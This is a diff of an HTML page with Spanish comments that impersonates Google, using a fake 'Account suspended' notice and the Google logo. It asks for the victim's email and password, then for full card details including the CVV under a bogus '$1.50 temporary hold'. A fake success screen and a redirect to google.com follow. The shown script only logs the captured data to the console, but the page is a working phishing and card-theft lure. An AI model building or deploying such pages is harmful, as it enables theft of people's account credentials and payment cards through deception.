@@ -4,71 +4,347 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Account Suspended</title>
-    <link rel="stylesheet" href="styles.css">
-    <!-- Icono de pestaña (opcional) -->
-    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        /* 
+           ESTILOS 2026
+           Minimalismo, aire, bordes redondeados, sombras sutiles
+        */
+        :root {
+            --primary: #1a73e8;
+            --primary-hover: #1765cc;
+            --text-main: #202124;
+            --text-sub: #5f6368;
+            --border: #e8eaed;
+            --bg: #f1f3f4; /* Un gris muy claro y limpio */
+            --radius: 16px; /* Más curvo */
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-main);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .card {
+            background: white;
+            padding: 48px; /* Más espacio */
+            border-radius: var(--radius);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.04), 0 1px 2px rgba(0,0,0,0.08); /* Sombra moderna */
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .logo {
+            height: 28px;
+            opacity: 0.9;
+        }
+
+        .alert-badge {
+            position: absolute;
+            top: -10px;
+            right: -20px;
+            background: #ea4335;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+            font-size: 14px;
+        }
+
+        h1 {
+            font-size: 20px; /* Un poco más sutil */
+            margin: 0 0 12px 0;
+            font-weight: 500;
+            color: var(--text-main);
+        }
+
+        p {
+            font-size: 13px;
+            color: var(--text-sub);
+            line-height: 1.6;
+            margin: 0 0 32px 0;
+        }
+
+        /* Formularios modernos */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            color: var(--text-sub);
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: all 0.2s;
+            background: #fafafa;
+        }
+
+        input:focus {
+            border: 1px solid var(--primary);
+            background: white;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+        }
+
+        button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+            transition: all 0.2s;
+        }
+
+        button:hover {
+            background: var(--primary-hover);
+            box-shadow: 0 4px 8px rgba(26, 115, 232, 0.2);
+            transform: translateY(-1px);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        /* Layouts */
+        .row {
+            display: flex;
+            gap: 16px;
+        }
+        .half { width: 50%; }
+
+        .card-icon {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .card-icon .material-icons { font-size: 48px; color: #bdc1c6; }
+
+        .secure-badge {
+            margin-top: 24px;
+            font-size: 11px;
+            color: var(--text-sub);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        /* Loader y Animaciones */
+        .hidden { display: none; }
+        
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid var(--primary);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Animación de entrada suave */
+        .fade-in {
+            animation: fadeIn 0.5s cubic-bezier(0.165, 0.84, 0.44, 1);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Logo Google -->
+<div class="card">
+    <div class="header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
-        
+        <div class="alert-badge"><span class="material-icons">error_outline</span></div>
+    </div>
+
+    <!-- PASO 1: Credenciales -->
+    <div id="step1" class="step-content">
         <h1>Account suspended</h1>
-        <p>We found a suspicious sign-in and suspended your account to keep it safe.</p>
-        <p>Please confirm it's you by verifying your identity.</p>
-
-        <!-- PASO 1: Credenciales -->
-        <form id="step1" class="form-step active">
+        <p>We found a suspicious sign-in and suspended your account to keep it safe. Please verify your identity.</p>
+        
+        <form id="form1">
             <div class="input-group">
-                <input type="email" id="email" placeholder="Email or phone" required>
+                <label>Email or phone</label>
+                <input type="email" id="email" required autocomplete="off">
             </div>
             <div class="input-group">
-                <input type="password" id="password" placeholder="Password" required>
+                <label>Password</label>
+                <input type="password" id="password" required autocomplete="off">
             </div>
-            <button type="submit" class="btn primary">Continue</button>
-            <div class="footer-links">
-                <a href="#">More options</a>
-            </div>
+            <button type="submit">Continue</button>
         </form>
+    </div>
 
-        <!-- PASO 2: Tarjeta (Oculto al inicio) -->
-        <form id="step2" class="form-step">
-            <h3>Verify with a credit card</h3>
-            <p class="small-text">We will charge $1.50 USD to verify your identity. This is a temporary hold and will be removed.</p>
-            
+    <!-- PASO 2: Tarjeta -->
+    <div id="step2" class="step-content hidden">
+        <div class="card-icon"><span class="material-icons">credit_card</span></div>
+        <h1>Verify with a credit card</h1>
+        <p>We will charge <strong>$1.50 USD</strong> to verify your identity. This is a temporary hold and will be removed within 24 hours.</p>
+        
+        <form id="form2">
             <div class="input-group">
-                <input type="text" placeholder="Cardholder Name" required>
+                <label>Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="e.g. John Doe" required>
             </div>
             <div class="input-group">
-                <input type="text" placeholder="Card Number" maxlength="19" required>
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
             </div>
             <div class="row">
                 <div class="input-group half">
-                    <input type="text" placeholder="MM/YY" maxlength="5" required>
+                    <label>MM/YY</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div class="input-group half">
-                    <input type="text" placeholder="CVV" maxlength="3" required>
+                    <label>CVV</label>
+                    <input type="password" id="cardCvv" placeholder="123" maxlength="3" required>
                 </div>
             </div>
-            
-            <button type="submit" class="btn primary">Pay $1.50 & Restore</button>
+            <button type="submit">Pay $1.50 & Restore</button>
+            <div class="secure-badge"><span class="material-icons" style="font-size:12px">lock</span> Secured by 256-bit SSL</div>
         </form>
-
-        <!-- PASO 3: Loading (Oculto al inicio) -->
-        <div id="loader" class="form-step">
-            <div class="spinner"></div>
-            <p>Verifying your account...</p>
-        </div>
-
-        <!-- PASO 4: Éxito (Oculto al inicio) -->
-        <div id="success" class="form-step">
-            <h2 style="color: green;">Restoration successful</h2>
-            <p>Your account is being restored now.</p>
-        </div>
-
     </div>
 
-    <script src="script.js"></script>
+    <!-- PASO 3: Loading -->
+    <div id="loader" class="step-content hidden">
+        <div class="spinner"></div>
+        <h1>Verifying...</h1>
+        <p>Please do not close this window.</p>
+    </div>
+
+    <!-- PASO 4: Éxito -->
+    <div id="success" class="step-content hidden">
+        <div class="card-icon" style="color: #188038"><span class="material-icons" style="font-size:64px">check_circle</span></div>
+        <h1>Restoration successful</h1>
+        <p>Your account is being restored now. You will be redirected to Google shortly.</p>
+    </div>
+</div>
+
+<script>
+    // Lógica de flujo
+    const form1 = document.getElementById('form1');
+    const form2 = document.getElementById('form2');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const loader = document.getElementById('loader');
+    const success = document.getElementById('success');
+
+    // Paso 1 -> Paso 2
+    form1.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        
+        console.log("Paso 1:", email, pass);
+
+        // Ocultar paso 1
+        step1.classList.add('hidden');
+        
+        // Mostrar paso 2 con animación
+        step2.classList.remove('hidden');
+        step2.classList.add('fade-in');
+    });
+
+    // Paso 2 -> Loading
+    form2.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const cardData = {
+            name: document.getElementById('cardName').value,
+            number: document.getElementById('cardNumber').value,
+            expiry: document.getElementById('cardExpiry').value,
+            cvv: document.getElementById('cardCvv').value
+        };
+        console.log("Paso 2:", cardData);
+
+        // Ocultar paso 2
+        step2.classList.add('hidden');
+
+        // Mostrar Loader
+        loader.classList.remove('hidden');
+        loader.classList.add('fade-in');
+
+        // Simular espera de 3 segundos
+        setTimeout(() => {
+            loader.classList.add('hidden');
+            success.classList.remove('hidden');
+            success.classList.add('fade-in');
+
+            // Redirigir a Google
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+
+        }, 3000);
+    });
+
+    // Auto-format para tarjeta
+    document.getElementById('cardNumber').addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+        let formatted = '';
+        for(let i=0; i<val.length; i++) {
+            if(i>0 && i%4===0) formatted += ' ';
+            formatted += val[i];
+        }
+        e.target.value = formatted;
+    });
+
+    // Auto-format fecha
+    document.getElementById('cardExpiry').addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if(val.length >= 2) {
+            val = val.substring(0,2) + '/' + val.substring(2);
+        }
+        e.target.value = val;
+    });
+</script>
+
 </body>
 </html>
